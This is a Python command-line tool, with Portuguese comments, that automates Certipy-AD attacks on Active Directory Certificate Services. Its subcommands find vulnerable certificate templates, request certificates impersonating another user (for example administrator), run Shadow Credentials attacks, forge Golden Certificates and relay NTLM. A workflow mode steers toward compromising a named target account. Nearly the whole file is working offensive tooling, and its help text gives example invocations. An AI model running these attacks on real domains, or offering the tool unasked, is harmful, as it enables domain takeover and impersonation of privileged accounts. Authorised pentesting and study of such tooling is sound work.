#!/usr/bin/env python3
"""
PwnCert - Certipy-AD Automation Tool
Automatiza comandos do Certipy-AD para AD CS enumeration e exploitation
Uso: python pwncert.py --help
"""

import subprocess
import argparse
import sys
import os
from typing import List

def print_banner():
    """Exibe o banner da ferramenta"""
    banner = """
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ██████╗ ██╗    ██╗███╗   ██╗ ██████╗███████╗██████╗ ████████╗
║   ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔════╝██╔══██╗╚══██╔══╝
║   ██████╔╝██║ █╗ ██║██╔██╗ ██║██║     █████╗  ██████╔╝   ██║   
║   ██╔═══╝ ██║███╗██║██║╚██╗██║██║     ██╔══╝  ██╔══██╗   ██║   
║   ██║     ╚███╔███╔╝██║ ╚████║╚██████╗███████╗██║  ██║   ██║   
║   ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝ ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   
║                                                               ║
║              Active Directory Certificate Services            ║
║                    Exploitation Automation                    ║
║                                                               ║
║   [+] Powered by Certipy-AD                                  ║
║   [+] ESC1-ESC16 Support                                     ║
║   [+] Author: 0x13-ByteZer0                             ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
    """
    print(banner)

class PwnCert:
    def __init__(self, domain: str, username: str, password: str = None, 
                 dc_ip: str = None, hashes: str = None, debug: bool = False):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.hashes = hashes
        self.debug = debug
        self.base_auth = self._build_auth()
    
    def _build_auth(self) -> List[str]:
        """Constrói os parâmetros de autenticação base"""
        auth = ['-username', self.username, '-domain', self.domain]
        
        if self.password:
            auth.extend(['-password', self.password])
        elif self.hashes:
            auth.extend(['-hashes', self.hashes])
        
        if self.dc_ip:
            auth.extend(['-dc-ip', self.dc_ip])
        
        if self.debug:
            auth.append('-debug')
        
        return auth
    
    def _run_command(self, cmd: List[str]) -> int:
        """Executa um comando do Certipy-AD"""
        full_cmd = ['certipy-ad'] + cmd
        print(f"\n[*] Executando: {' '.join(full_cmd)}")
        print("=" * 80)
        
        try:
            result = subprocess.run(full_cmd, check=False)
            print("=" * 80)
            return result.returncode
        except FileNotFoundError:
            print("[!] Erro: certipy-ad não encontrado.")
            print("[!] Instale com: pip install certipy-ad")
            return 1
        except Exception as e:
            print(f"[!] Erro ao executar comando: {e}")
            return 1
    
    def find(self, output: str = None, vulnerable: bool = False, 
             enabled: bool = False, stdout: bool = False, json: bool = False) -> int:
        """Encontra CAs e templates"""
        cmd = ['find'] + self.base_auth
        
        if vulnerable:
            cmd.append('-vulnerable')
        if enabled:
            cmd.append('-enabled')
        if stdout:
            cmd.append('-stdout')
        if json:
            cmd.append('-json')
        if output:
            cmd.extend(['-output', output])
        
        return self._run_command(cmd)
    
    def req(self, ca: str, template: str, alt: str = None, 
            upn: str = None, dns: str = None, subject: str = None,
            output: str = None) -> int:
        """Requisita um certificado"""
        cmd = ['req'] + self.base_auth + ['-ca', ca, '-template', template]
        
        if alt:
            cmd.extend(['-alt', alt])
        if upn:
            cmd.extend(['-upn', upn])
        if dns:
            cmd.extend(['-dns', dns])
        if subject:
            cmd.extend(['-subject', subject])
        if output:
            cmd.extend(['-output', output])
        
        return self._run_command(cmd)
    
    def auth(self, pfx: str, domain: str = None, dc_ip: str = None,
             username: str = None, kirbi: bool = False) -> int:
        """Autentica usando certificado"""
        cmd = ['auth', '-pfx', pfx]
        
        if domain:
            cmd.extend(['-domain', domain])
        else:
            cmd.extend(['-domain', self.domain])
        
        if dc_ip:
            cmd.extend(['-dc-ip', dc_ip])
        elif self.dc_ip:
            cmd.extend(['-dc-ip', self.dc_ip])
        
        if username:
            cmd.extend(['-username', username])
        
        if kirbi:
            cmd.append('-kirbi')
        
        return self._run_command(cmd)
    
    def shadow(self, account: str, device_id: str = None, 
               device_name: str = None, action: str = 'auto') -> int:
        """Shadow Credentials attack"""
        cmd = ['shadow'] + self.base_auth + ['-account', account, '-action', action]
        
        if device_id:
            cmd.extend(['-device-id', device_id])
        if device_name:
            cmd.extend(['-device-name', device_name])
        
        return self._run_command(cmd)
    
    def forge(self, ca_pfx: str, upn: str, subject: str = None, 
              alt: str = None, output: str = None) -> int:
        """Forge um certificado (Golden Certificate)"""
        cmd = ['forge', '-ca-pfx', ca_pfx, '-upn', upn]
        
        if subject:
            cmd.extend(['-subject', subject])
        if alt:
            cmd.extend(['-alt', alt])
        if output:
            cmd.extend(['-output', output])
        
        return self._run_command(cmd)
    
    def relay(self, ca: str, template: str, target: str = None) -> int:
        """Relay NTLM para AD CS"""
        cmd = ['relay', '-ca', ca, '-template', template]
        
        if target:
            cmd.extend(['-target', target])
        
        return self._run_command(cmd)
    
    def cert(self, export: str = None, pfx: str = None, password: str = None,
             out: str = None, nocert: bool = False, nokey: bool = False) -> int:
        """Manipula certificados"""
        cmd = ['cert']
        
        if export:
            cmd.extend(['-export', export])
        if pfx:
            cmd.extend(['-pfx', pfx])
        if password:
            cmd.extend(['-password', password])
        if out:
            cmd.extend(['-out', out])
        if nocert:
            cmd.append('-nocert')
        if nokey:
            cmd.append('-nokey')
        
        return self._run_command(cmd)


def main():
    print_banner()
    
    parser = argparse.ArgumentParser(
        description='PwnCert - Certipy-AD Automation Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  # Encontrar templates vulneráveis
  %(prog)s find -u admin -p Pass123 -d domain.local --vulnerable
  
  # Requisitar certificado (ESC1)
  %(prog)s req -u user -p Pass123 -d domain.local -ca CA-NAME -t VulnTemplate -a administrator
  
  # Autenticar com certificado
  %(prog)s auth --pfx administrator.pfx -d domain.local
  
  # Shadow Credentials
  %(prog)s shadow -u admin -p Pass123 -d domain.local -a targetuser
  
  # Full automation workflow
  %(prog)s workflow -u admin -p Pass123 -d domain.local --target administrator
        """
    )
    
    # Argumentos globais
    parser.add_argument('-u', '--username', required=True, help='Username')
    parser.add_argument('-p', '--password', help='Password')
    parser.add_argument('-H', '--hashes', help='NTLM hashes (LM:NT)')
    parser.add_argument('-d', '--domain', required=True, help='Domain')
    parser.add_argument('--dc-ip', help='IP do Domain Controller')
    parser.add_argument('--debug', action='store_true', help='Debug mode')
    
    # Subcomandos
    subparsers = parser.add_subparsers(dest='command', help='Comando a executar')
    
    # Find
    find_parser = subparsers.add_parser('find', help='Enumerar CAs e templates')
    find_parser.add_argument('-o', '--output', help='Arquivo de saída')
    find_parser.add_argument('-v', '--vulnerable', action='store_true', help='Apenas vulneráveis')
    find_parser.add_argument('-e', '--enabled', action='store_true', help='Apenas habilitados')
    find_parser.add_argument('-s', '--stdout', action='store_true', help='Output para stdout')
    find_parser.add_argument('-j', '--json', action='store_true', help='Formato JSON')
    
    # Request
    req_parser = subparsers.add_parser('req', help='Requisitar certificado')
    req_parser.add_argument('-ca', '--ca', required=True, help='Nome da CA')
    req_parser.add_argument('-t', '--template', required=True, help='Nome do template')
    req_parser.add_argument('-a', '--alt', help='Alternative UPN')
    req_parser.add_argument('--upn', help='User Principal Name')
    req_parser.add_argument('--dns', help='DNS Name')
    req_parser.add_argument('--subject', help='Subject')
    req_parser.add_argument('-o', '--output', help='Nome do arquivo de saída')
    
    # Auth
    auth_parser = subparsers.add_parser('auth', help='Autenticar com certificado')
    auth_parser.add_argument('--pfx', required=True, help='Arquivo PFX')
    auth_parser.add_argument('--domain', help='Domain (sobrescreve o global)')
    auth_parser.add_argument('--dc-ip-auth', dest='dc_ip_auth', help='DC IP (sobrescreve o global)')
    auth_parser.add_argument('--username-auth', dest='username_auth', help='Username (sobrescreve o global)')
    auth_parser.add_argument('-k', '--kirbi', action='store_true', help='Output em formato kirbi')
    
    # Shadow
    shadow_parser = subparsers.add_parser('shadow', help='Shadow Credentials attack')
    shadow_parser.add_argument('-a', '--account', required=True, help='Target account')
    shadow_parser.add_argument('--device-id', help='Device ID')
    shadow_parser.add_argument('--device-name', help='Device Name')
    shadow_parser.add_argument('--action', default='auto', choices=['auto', 'add', 'remove', 'list'], 
                               help='Action to perform')
    
    # Forge
    forge_parser = subparsers.add_parser('forge', help='Forge certificate (Golden Certificate)')
    forge_parser.add_argument('--ca-pfx', required=True, help='CA PFX file')
    forge_parser.add_argument('--upn', required=True, help='Target UPN')
    forge_parser.add_argument('--subject', help='Subject')
    forge_parser.add_argument('--alt', help='Alternative name')
    forge_parser.add_argument('-o', '--output', help='Output filename')
    
    # Relay
    relay_parser = subparsers.add_parser('relay', help='Relay NTLM to AD CS')
    relay_parser.add_argument('-ca', '--ca', required=True, help='CA name')
    relay_parser.add_argument('-t', '--template', required=True, help='Template name')
    relay_parser.add_argument('--target', help='Target host')
    
    # Cert
    cert_parser = subparsers.add_parser('cert', help='Certificate manipulation')
    cert_parser.add_argument('-e', '--export', help='Export from PFX')
    cert_parser.add_argument('--pfx', help='PFX file')
    cert_parser.add_argument('--password', help='PFX password')
    cert_parser.add_argument('--out', help='Output filename')
    cert_parser.add_argument('--nocert', action='store_true', help='Don\'t export certificate')
    cert_parser.add_argument('--nokey', action='store_true', help='Don\'t export private key')
    
    # Workflow
    workflow_parser = subparsers.add_parser('workflow', help='Automated workflow completo')
    workflow_parser.add_argument('--target', required=True, help='Target user para comprometer')
    workflow_parser.add_argument('-o', '--output', default='certipy_results', help='Diretório de saída')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return 1
    
    # Validar autenticação
    if not args.password and not args.hashes:
        print("[!] Erro: Forneça -p/--password ou -H/--hashes")
        return 1
    
    # Criar instância
    pwncert = PwnCert(
        domain=args.domain,
        username=args.username,
        password=args.password,
        dc_ip=args.dc_ip,
        hashes=args.hashes,
        debug=args.debug
    )
    
    # Executar comando
    if args.command == 'find':
        return pwncert.find(
            output=args.output,
            vulnerable=args.vulnerable,
            enabled=args.enabled,
            stdout=args.stdout,
            json=args.json
        )
    
    elif args.command == 'req':
        return pwncert.req(
            ca=args.ca,
            template=args.template,
            alt=args.alt,
            upn=args.upn,
            dns=args.dns,
            subject=args.subject,
            output=args.output
        )
    
    elif args.command == 'auth':
        return pwncert.auth(
            pfx=args.pfx,
            domain=args.domain,
            dc_ip=args.dc_ip_auth,
            username=args.username_auth,
            kirbi=args.kirbi
        )
    
    elif args.command == 'shadow':
        return pwncert.shadow(
            account=args.account,
            device_id=args.device_id,
            device_name=args.device_name,
            action=args.action
        )
    
    elif args.command == 'forge':
        return pwncert.forge(
            ca_pfx=args.ca_pfx,
            upn=args.upn,
            subject=args.subject,
            alt=args.alt,
            output=args.output
        )
    
    elif args.command == 'relay':
        return pwncert.relay(
            ca=args.ca,
            template=args.template,
            target=args.target
        )
    
    elif args.command == 'cert':
        return pwncert.cert(
            export=args.export,
            pfx=args.pfx,
            password=args.password,
            out=args.out,
            nocert=args.nocert,
            nokey=args.nokey
        )
    
    elif args.command == 'workflow':
        print("\n[+] Iniciando PwnCert workflow automatizado de exploração AD CS")
        print(f"[+] Target: {args.target}")
        print(f"[+] Output: {args.output}")
        
        os.makedirs(args.output, exist_ok=True)
        
        # Step 1: Find vulnerable templates
        print("\n[STEP 1] Enumerando templates vulneráveis...")
        ret = pwncert.find(
            output=f"{args.output}/enumeration",
            vulnerable=True,
            enabled=True,
            json=True
        )
        
        if ret != 0:
            print("[!] Falha na enumeração")
            return ret
        
        print("\n[!] Analise os resultados em: {}/enumeration.json".format(args.output))
        print("[!] Para continuar o workflow, você precisa:")
        print("    1. Identificar uma CA e template vulnerável")
        print("    2. Executar: {} req -ca CA_NAME -t TEMPLATE -a {}".format(
            sys.argv[0], args.target))
        print("    3. Executar: {} auth --pfx {}.pfx".format(
            sys.argv[0], args.target))
        
        return 0
    
    return 1


if __name__ == '__main__':
    sys.exit(main())